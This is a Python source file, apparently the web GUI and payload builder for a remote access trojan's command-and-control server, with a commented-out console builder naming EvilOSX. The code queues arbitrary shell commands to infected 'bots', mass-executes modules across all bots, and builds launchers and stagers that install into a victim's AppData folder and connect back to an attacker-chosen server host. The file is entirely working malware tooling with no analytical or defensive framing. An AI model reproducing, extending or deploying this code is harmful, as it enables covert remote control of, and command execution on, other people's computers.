from threading import Thread
from server import modules
from server.model import Command, CommandType
from bot import launchers,loaders
class webgui():
    def __init__(self,model):
        self._model = model
    
    def get_module_list(self):
        """
        gets module list
        """
        modulesList = []
        for module_name in modules.get_names():
            try:
                module = modules.get_module(module_name)
                if not module:
                    module = modules.load_module(module_name,self._model)
                modulesList.append([module_name,module])
            except AttributeError as ex:
                print(ex)
        return modulesList
    
    def selectedModulesOpt(self,module_name):
        """
        returns the module setup messages
        """
        module = modules.get_module(module_name)
        if not module:
            module = modules.load_module(module_name,self._model)
        info = module.get_setup_messages()
        return info

    def shellCommand(self,command,bot_id):
        """
        function to insert or run shell commands
        """
        self._model.add_command(bot_id, Command(CommandType.SHELL, command.encode()))
        return 200

    
    def botlist(self):
         """
         returns the botliist for website
         """
         bots = self._model.get_bots()
         return bots
    
    def botpath(self,bot_id):
        """
        returns the current path stored in the database
        """
        bot = self._model.get_bot(bot_id)
        return bot.local_path


    
    def command(self,command,bot_uid):
        self._model.add_command(bot_uid,Command(CommandType.SHELL, command.encode()))
    
    def runModule(self,module_name,set_options,bot_uid):
         module_thread = Thread(target=self._run_module, args=(module_name,set_options,bot_uid))
         module_thread.daemon = True
         module_thread.start()


    def _run_module(self, module_name,set_options,bot_uid, mass_execute=False):
        """Setup then run the module, required because otherwise calls to prompt block the main thread."""
        try:
            module = modules.get_module(module_name)
            code = ("", b"")
            if not module:
                module = modules.load_module(module_name, self._model)

            successful, options = module.setup(set_options)
            if not successful:
                 return "Module setup failed or cancelled.", "attention"
            else:
                if not options:
                    options = {}

                options["module_name"] = module_name
            if mass_execute:
                bots = self._model.get_bots()

                for bot in bots:
                    if module_name == "remove_bot":
                        if code[0] != bot.loader_name:
                            pass
                            # code = (bot.loader_name, loaders.get_remove_code(bot.loader_name))
                    elif module_name == "update_bot":
                        pass
                        # if code[0] != bot.loader_name:
                        #     code = (bot.loader_name, loaders.get_update_code(bot.loader_name))
                    else:
                        if not code[0]:
                            code = ("", modules.get_code(module_name))

                    self._model.add_command(bot.uid, Command(
                        CommandType.MODULE, code[1], options
                    ))

                return "Module added to the queue of {} bot(s).".format(len(bots)), "info"
            else:
                if module_name == "remove_bot":
                    pass
                    # code = loaders.get_remove_code(self._connected_bot.loader_name)
                elif module_name == "update_bot":
                    pass
                    # code = loaders.get_update_code(self._connected_bot.loader_name)
                else:
                    code = modules.get_code(module_name)
                    print(code)

                self._model.add_command(bot_uid, Command(
                    CommandType.MODULE, code, options
                ))

                return ("Module added to the queue")
        except ImportError:
            res = ""
            res += "Failed to find module: {}".format(module_name), "attention"
            res += "Type \"modules\" to get a list of available modules.", "attention"
            return res
    
    def getPostKeyName(self,module_name):
        module = modules.get_module(module_name)
        if not module:
            module = modules.load_module(module_name,self._model)
        infos = module.get_setup_messages()
        keys = []
        for info in infos:
            keys.append(info[1])
        return keys
    


class Builder:
    def launcher_list(self):
        launcher_names = launchers.get_names()
        return launcher_names

    def loader_list(self):
        loaders_name = loaders.get_names()
        print(loaders_name)
        return loaders_name
    
    
    def loader_infos(self,loader_name):
        print(loaders.get_option_messages(loader_name))
        return loaders.get_option_messages(loader_name)
    
    def getPostKeyName(self,module_name):
        infos = loaders.get_option_messages(module_name)
        keys = []
        for info in infos:
            keys.append(info[1])
        return keys

    def builder(self,selected_launcher,selected_loader,set_options,program_directory,server_host):
        loader_options = loaders.get_options(selected_loader, set_options)
        if program_directory == "APPDATA" or program_directory == "":
            loader_options["program_directory"] = r"%Appdata%\\Launcher"
        else:
            loader_options["program_directory"] = program_directory
        stager = launchers.create_stager(server_host,loader_options)
        launcher_extension, launcher = launchers.generate(selected_launcher, stager)
        return launcher,launcher_extension


'''
def builder():
    server_host = input(MESSAGE_INPUT + "Server host (where EvilOSX will connect to): ") #ServerHost for RAT
    server_port = int(input(MESSAGE_INPUT + "Server port: ")) #Server Port for RAT
    program_directory = input(MESSAGE_INPUT + "Where should EvilOSX live? "
                                              "(Leave empty for ~AppData\.<RANDOM>): ") #File path

    if not program_directory:
        program_directory = r"%Appdata%//{}".format(launchers.get_random_string()) #This Line of Code creates a random file path in AppData directory
    
    # Select a launcher
    launcher_names = launchers.get_names()

    print(MESSAGE_INFO + "{} available launchers: ".format(len(launcher_names)))
    for i, launcher_name in enumerate(launcher_names):
        print("{} = {}".format(str(i), launcher_name))

    while True:
        try:
            selected_launcher = input(MESSAGE_INPUT + "Launcher to use (Leave empty for 1): ")

            if not selected_launcher:
                selected_launcher = 1
            else:
                selected_launcher = int(selected_launcher)

            selected_launcher = launcher_names[selected_launcher]
            break
        except (ValueError, IndexError):
            continue

    # Select a loader
    loader_names = loaders.get_names()

    print(MESSAGE_INFO + "{} available loaders: ".format(len(loader_names)))
    for i, loader_name in enumerate(loader_names):
        print("{} = {} ({})".format(str(i), loader_name, loaders.get_info(loader_name)["Description"]))

    while True:
        try:
            selected_loader = input(MESSAGE_INPUT + "Loader to use (Leave empty for 0): ")

            if not selected_loader:
                selected_loader = 0
            else:
                selected_loader = int(selected_loader)

            selected_loader = loader_names[selected_loader]
            break
        except (ValueError, IndexError):
            continue

    set_options = []

    for option_message in loaders.get_option_messages(selected_loader):
        set_options.append(input(MESSAGE_INPUT + option_message))

    # Loader setup
    loader_options = loaders.get_options(selected_loader, set_options)
    loader_options["program_directory"] = program_directory

    # Create the launcher
    print(MESSAGE_INFO + "Creating the \"{}\" launcher...".format(selected_launcher))
    stager = launchers.create_stager(server_host, server_port, loader_options)

    launcher_extension, launcher = launchers.generate(selected_launcher, stager)
    launcher_path = path.realpath(path.join(path.dirname(__file__), "data", "builds", "Launcher-{}.{}".format(
        str(uuid4())[:6], launcher_extension
    )))

    with open(launcher_path, "w") as output_file:
        output_file.write(launcher)

    print(MESSAGE_INFO + "Launcher written to: {}".format(launcher_path))
'''